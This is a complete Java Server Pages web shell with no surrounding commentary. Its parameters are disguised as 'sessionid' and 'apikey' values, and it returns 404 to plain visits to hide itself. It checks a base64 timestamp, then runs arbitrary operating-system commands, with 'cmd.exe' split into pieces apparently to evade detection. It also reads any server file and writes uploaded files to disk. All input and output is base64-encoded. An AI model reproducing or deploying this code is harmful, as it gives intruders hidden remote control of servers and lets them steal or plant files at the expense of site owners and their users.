<%@ page import="java.util.*,java.io.*"%>


<%!

    private final static char[] ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".toCharArray();

    private static int[]  toInt   = new int[128];

    static {
        for(int i=0; i< ALPHABET.length; i++){
            toInt[ALPHABET[i]]= i;
        }
    }

    /**
     * Translates the specified byte array into Base64 string.
     *
     * @param buf the byte array (not null)
     * @return the translated Base64 string (not null)
     */
    public static String encode(byte[] buf){
        int size = buf.length;
        char[] ar = new char[((size + 2) / 3) * 4];
        int a = 0;
        int i=0;
        while(i < size){
            byte b0 = buf[i++];
            byte b1 = (i < size) ? buf[i++] : 0;
            byte b2 = (i < size) ? buf[i++] : 0;

            int mask = 0x3F;
            ar[a++] = ALPHABET[(b0 >> 2) & mask];
            ar[a++] = ALPHABET[((b0 << 4) | ((b1 & 0xFF) >> 4)) & mask];
            ar[a++] = ALPHABET[((b1 << 2) | ((b2 & 0xFF) >> 6)) & mask];
            ar[a++] = ALPHABET[b2 & mask];
        }
        switch(size % 3){
            case 1: ar[--a]  = '=';
            case 2: ar[--a]  = '=';
        }
        return new String(ar);
    }

    /**
     * Translates the specified Base64 string into a byte array.
     *
     * @param s the Base64 string (not null)
     * @return the byte array (not null)
     */
    public static byte[] decode(String s){
        int delta = s.endsWith( "==" ) ? 2 : s.endsWith( "=" ) ? 1 : 0;
        byte[] buffer = new byte[s.length()*3/4 - delta];
        int mask = 0xFF;
        int index = 0;
        for(int i=0; i< s.length(); i+=4){
            int c0 = toInt[s.charAt( i )];
            int c1 = toInt[s.charAt( i + 1)];
            buffer[index++]= (byte)(((c0 << 2) | (c1 >> 4)) & mask);
            if(index >= buffer.length){
                return buffer;
            }
            int c2 = toInt[s.charAt( i + 2)];
            buffer[index++]= (byte)(((c1 << 4) | (c2 >> 2)) & mask);
            if(index >= buffer.length){
                return buffer;
            }
            int c3 = toInt[s.charAt( i + 3 )];
            buffer[index++]= (byte)(((c2 << 6) | c3) & mask);
        }
        return buffer;
    }

    private static byte[] loadFile(File file) throws IOException {
        InputStream is = new FileInputStream(file);
 
        long length = file.length();

        byte[] bytes = new byte[(int)length];
        
        int offset = 0;
        int numRead = 0;
        while (offset < bytes.length
               && (numRead=is.read(bytes, offset, bytes.length-offset)) >= 0) {
            offset += numRead;
        }
 
        if (offset < bytes.length) {
            throw new IOException("Could not completely read file "+file.getName());
        }
 
        is.close();
        return bytes;
    } 


%>


<%
if (((HttpServletRequest) request).getMethod().equals("GET")) {
    ((HttpServletResponse) response).sendError(HttpServletResponse.SC_NOT_FOUND);
}
else
{
	String s = request.getParameter("sessionid");
	if (s == null) {
		((HttpServletResponse) response).sendError(HttpServletResponse.SC_NOT_FOUND);		
	}
	else {
		
		byte[] tdecoded = decode(s);
		//for (int i=0;i<tdecoded.length;i++){
		//	tdecoded[i] = (byte)((int) tdecoded[i] ^ 137);
		//}
		String sessionid = new String(tdecoded, "UTF-8");
		Integer int_id = Integer.parseInt(sessionid);
		Long t = System.currentTimeMillis() / 1000;
		Integer current = t.intValue();
		Integer scope = 43200;
		Integer min = current - scope;
		Integer max = current + scope;
		
		if (int_id > max || int_id < min){
			Thread.sleep(8000);
			((HttpServletResponse) response).addHeader("Expires",String.valueOf(current-int_id));
			((HttpServletResponse) response).sendError(HttpServletResponse.SC_REQUEST_TIMEOUT);
		}
		else {
			
			Process p = null;

			if (request.getParameter("apikey") != null) {
				String c = request.getParameter("apikey");
				byte[] decoded = decode(c);
				String sDecoded = new String(decoded, "UTF-8");

				if (System.getProperty("os.name").toUpperCase().indexOf("WINDOWS") != -1) 
					{
						p = Runtime.getRuntime().exec("c" + "m" + "d" + ".e" + "xe /C " + sDecoded);
					}
				else
					{
						p = Runtime.getRuntime().exec(c);
					}


				String output = null;
				

				InputStream stdout = p.getInputStream();
				DataInputStream disStdout = new DataInputStream(stdout);
				String disrStdout = disStdout.readLine();
				String outputStdout = disrStdout;

				while ( disrStdout != null ) {
					disrStdout = disStdout.readLine();
					if (disrStdout != null) {
						outputStdout += disrStdout + '\n';
					}            
				}
				InputStream stderr = p.getErrorStream();
				DataInputStream disStderr = new DataInputStream(stderr);
				String disrStderr = disStderr.readLine();                 
				String outputStderr = disrStderr;

				while ( disrStderr != null ) {
					disrStderr = disStderr.readLine();
					if (disrStderr != null) {
						outputStderr += disrStderr + '\n';
					}                
				}            

				if (outputStdout != null){
					output = outputStdout;        
				}
			   
				if (outputStderr != null){
					output += outputStderr;
				}
				
				if (output == null){
					output = "[!] Command not found on remote system.  Or error accessing output.";
				}

						byte[] encoded = output.getBytes("UTF-8");
						out.println(encode(encoded));
			} 
			else if (request.getParameter("apikeyd") != null) {
				String filePath = request.getParameter("apikeyd");
				byte[] decoded = decode(filePath);
				String sDecoded = new String(decoded, "UTF-8");
				
				File f = new File(sDecoded);

				String output = null;

				if (f.exists() && f.canRead()) {
					response.setContentType("application/octet-stream");
					response.setHeader("Content-Disposition", "attachment;filename=\"" + f.getName()
							+ "\"");
					
					byte[] bytes = loadFile(f);
					String encoded = encode(bytes);

					out.println(encoded);

				}
				else {
					//Do Nothing
				}
			}
			else if (request.getParameter("apikeyu") != null) {
				response.setContentType("application/octet-stream");
				byte[] decoded = decode(request.getParameter("apikeyu"));
				String filePath = new String(decoded, "UTF-8");
				File file = new File(filePath);
				
				
				String output = null;

				if (file.exists())
				{
					output = "\t[!] File already exists: " + filePath;
					byte[] encoded = output.getBytes("UTF-8");
					out.println(encode(encoded));
				}
				else
				{				
					try
					{
						FileOutputStream fstream = new FileOutputStream(file);
						String feed = request.getParameter("feed");
						
						fstream.write(decode(feed));

						fstream.close();
						output = "\tUpload Complete: " + filePath;
						byte[] encoded = output.getBytes("UTF-8");
						out.println(encode(encoded));

					}
					catch (Exception e)
					{
						output = "\tERROR:\n" + e;
						byte[] encoded = output.getBytes("UTF-8");
						out.println(encode(encoded));
					}

					
				}
	
			}


			else {
				((HttpServletResponse) response).sendError(HttpServletResponse.SC_NOT_FOUND);
			}

		}
	}
}

%>

